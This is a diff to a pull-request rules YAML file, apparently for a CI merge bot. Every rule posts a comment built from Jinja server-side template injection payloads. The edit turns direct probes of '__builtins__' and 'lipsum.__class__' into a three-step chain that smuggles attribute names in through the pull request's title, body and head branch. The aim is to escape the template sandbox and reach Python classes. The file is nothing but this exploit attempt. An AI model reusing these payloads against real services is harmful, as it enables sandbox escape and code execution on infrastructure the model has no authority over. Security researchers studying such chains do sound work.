@@ -1,23 +1,23 @@
 pull_request_rules:
-  - name: ssti-smuggled-dunder
+  - name: smuggled-globals
     conditions:
       - base=main
     actions:
       comment:
         message: |
-          TITLE={{ title }}
-          RESULT={{ ([dict]|map(attribute=title))|first }}
-  - name: ssti-smuggled-builtins
+          STEP1 title={{ title }}
+          STEP1 RESULT={{ ([dict]|map(attribute=title))|first }}
+  - name: smuggled-class
     conditions:
       - base=main
     actions:
       comment:
         message: |
-          BUILTINS={{ ([dict]|map(attribute=title))|first|attr("__builtins__") }}
-  - name: ssti-get-class
+          STEP2 RESULT={{ ([dict]|map(attribute=title))|first|attr(body) }}
+  - name: smuggled-subclasses
     conditions:
       - base=main
     actions:
       comment:
         message: |
-          CLASS_TEST={{ lipsum.__class__ }}
+          STEP3 RESULT={{ ([dict]|map(attribute=title))|first|attr(body)|attr(head) }}
